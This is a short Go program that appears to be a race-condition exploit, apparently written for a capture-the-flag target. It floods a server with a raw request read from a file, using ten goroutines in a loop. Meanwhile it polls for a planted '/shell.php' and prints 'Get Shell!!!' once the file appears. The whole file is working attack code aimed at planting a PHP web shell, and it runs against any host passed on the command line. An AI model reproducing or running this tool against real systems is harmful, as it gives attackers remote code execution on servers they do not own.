package main

import (
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"time"
)

func main() {
	var hp string
	var request_file string
	if len(os.Args) > 1 {
		hp = os.Args[1]
		request_file = os.Args[2]
	} else {
		hp = "9.inhann.top:20009"
		request_file = "./request.txt"
	}
	block := make(chan bool, 1)
	content, _ := ioutil.ReadFile(request_file)
	for i := 0; i < 10; i++ {
		go func(content []byte, hp string) {
			for {
				conn, _ := net.Dial("tcp", hp)
				conn.Write(content)
				conn.Close()
			}
		}(content, hp)
	}
	go func(block chan bool, hp string) {
		for {
			u := "http://" + hp
			client := http.Client{
				Timeout: time.Second * 5,
			}
			resp, err := client.Get(u + "/shell.php")
			if err == nil && resp.StatusCode == 200 {
				println("[+] Get Shell!!!")
				block <- false
			}
		}
	}(block, hp)
	<-block
}
